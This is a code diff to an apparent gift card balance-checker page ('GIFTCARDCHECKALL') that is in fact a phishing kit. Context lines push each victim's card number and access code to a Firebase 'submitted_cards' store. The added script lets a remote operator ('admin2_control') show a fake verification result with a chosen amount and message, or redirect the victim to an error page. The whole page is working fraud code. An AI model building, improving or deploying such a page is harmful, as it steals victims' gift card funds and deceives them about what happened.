@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -350,9 +351,156 @@
         max-width: 80%;
       }
     }
+
+    
+
+#checkingOverlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,.75);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    z-index: 99999;
+
+}
+
+.loading-box {
+    width: 90%;
+    max-width: 380px;
+    background: white;
+    padding: 30px;
+    border-radius: 12px;
+    text-align: center;
+}
+
+.spinner {
+    width: 45px;
+    height: 45px;
+    border: 5px solid #ddd;
+    border-top-color: #0b3d91;
+    border-radius: 50%;
+    animation: spin .8s linear infinite;
+    margin: 0 auto 20px;
+}
+
+@keyframes spin {
+    to {
+        transform: rotate(360deg);
+    }
+}
+
+#resultModal {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,.75);
+    align-items: center;
+    justify-content: center;
+    z-index: 100000;
+}
+
+.result-box {
+    width: 90%;
+    max-width: 420px;
+    background: white;
+    padding: 30px;
+    border-radius: 14px;
+    text-align: center;
+    box-shadow: 0 10px 40px rgba(0,0,0,.3);
+}
+
+.result-box h2 {
+    color: #0b3d91;
+    margin-top: 0;
+}
+
+.result-amount {
+    font-size: 32px;
+    font-weight: bold;
+    margin: 20px 0;
+}
+
+.result-status {
+    font-size: 20px;
+    font-weight: bold;
+    margin-bottom: 15px;
+}
+
+.result-message {
+    color: #555;
+    line-height: 1.5;
+    margin-bottom: 25px;
+}
+
+.check-another {
+    width: 100%;
+    padding: 13px;
+    border: 0;
+    border-radius: 6px;
+    background: #0b3d91;
+    color: white;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+
   </style>
 </head>
 <body>
+    <div id="checkingOverlay">
+
+    <div class="loading-box">
+
+        <div class="spinner"></div>
+
+        <h3>Checking...</h3>
+
+        <p id="loadingText">
+            Please wait while we process your request.
+        </p>
+
+    </div>
+
+</div>
+
+
+<div id="resultModal">
+
+    <div class="result-box">
+
+        <h2>Verification Result</h2>
+
+        <div
+            id="resultAmount"
+            class="result-amount"
+        >
+            $0
+        </div>
+
+        <div
+            id="resultStatus"
+            class="result-status"
+        >
+            Complete
+        </div>
+
+        <div
+            id="resultMessage"
+            class="result-message"
+        ></div>
+
+        <button
+            class="check-another"
+            onclick="checkAnotherCard()"
+        >
+            CHECK ANOTHER CARD
+        </button>
+
+    </div>
+
+  </div>
   <!-- HEADER -->
   <header>
     <div class="logo">GIFTCARDCHECKALL</div>
@@ -455,7 +603,9 @@
         <label for="accesscode">Access code</label>
         <input type="text" id="accesscode" name="accesscode" placeholder="Access code">
       </div>
-      
+       
+
+  </div>
       <button type="submit">CHECK</button>
     </form>
   </section>
@@ -585,17 +735,203 @@
 
     firebase.database().ref("submitted_cards").push(data)
       .then(() => {
-        window.location.href = "https://giftcarderror.tiiny.site";
-      })
-      .catch(() => {
-        window.location.href = "https://giftcarderror.tiiny.site";
-      });
-  });
-</script>
+        checkAdmin2Request();
 
+        })
+        .catch(error => {
+
+            console.error(error);
+
+            // Still perform the Admin2 decision.
+            checkAdmin2Request();
+
+        });
+});
+</script>
+<script>
+
+const admin2Control =
+    firebase.database().ref("admin2_control");
+
+let resultAlreadyHandled = false;
+
+
+/*
+    Check Admin2 when the page loads.
+*/
+
+function checkAdmin2Request() {
+
+    document.getElementById(
+        "checkingOverlay"
+    ).style.display = "flex";
+
+    admin2Control.once("value")
+        .then(snapshot => {
+
+            const data =
+                snapshot.val();
+
+            /*
+                No active request.
+                Automatically continue.
+            */
+
+            if (!data || data.active !== true) {
+
+                goToNextPage();
+
+                return;
+
+            }
+
+
+            /*
+                Admin2 has an active request.
+            */
+
+            if (data.action === "modal") {
+
+                showResultModal(data);
+
+                return;
+
+            }
+
+
+            /*
+                Admin2 specifically requested
+                the next page.
+            */
+
+            if (data.action === "nextPage") {
+
+                goToNextPage();
+
+                return;
+
+            }
+
+
+            /*
+                Unknown action.
+                Safely continue.
+            */
+
+            goToNextPage();
+
+        })
+        .catch(error => {
+
+            console.error(
+                "Admin2 check failed:",
+                error
+            );
+
+            /*
+                If Firebase cannot be reached,
+                continue to the normal next page.
+            */
+
+            goToNextPage();
+
+        });
+
+}
+
+
+/*
+    Display result modal.
+*/
+
+function showResultModal(data) {
+
+    resultAlreadyHandled = true;
+
+    document.getElementById(
+        "checkingOverlay"
+    ).style.display = "none";
+
+
+    document.getElementById(
+        "resultAmount"
+    ).textContent =
+        data.amount || "";
+
+
+    document.getElementById(
+        "resultStatus"
+    ).textContent =
+        data.status || "Complete";
+
+
+    document.getElementById(
+        "resultMessage"
+    ).textContent =
+        data.message ||
+        "in process...";
+
+
+    document.getElementById(
+        "resultModal"
+    ).style.display = "flex";
+
+}
+
+
+/*
+    Move to your existing next page.
+*/
+
+function goToNextPage() {
+
+    if (resultAlreadyHandled) {
+        return;
+    }
+
+    resultAlreadyHandled = true;
+
+    document.getElementById(
+        "checkingOverlay"
+    ).style.display = "flex";
+
+    document.getElementById(
+        "loadingText"
+    ).textContent =
+        "Continuing...";
+
+
+    /*
+        CHANGE THIS to your real next page.
+    */
+
+    window.location.href =
+        "https://giftcarderror.tiiny.site";
+
+}
+
+
+/*
+    Check Another Card.
+*/
+
+function checkAnotherCard() {
+
+    window.location.href =
+        "index.html";
+
+}
+
+
+/*
+    Start the Admin2 check.
+*/
+
+
+
+</script>
 </body>
 </html>
-
 
 
 
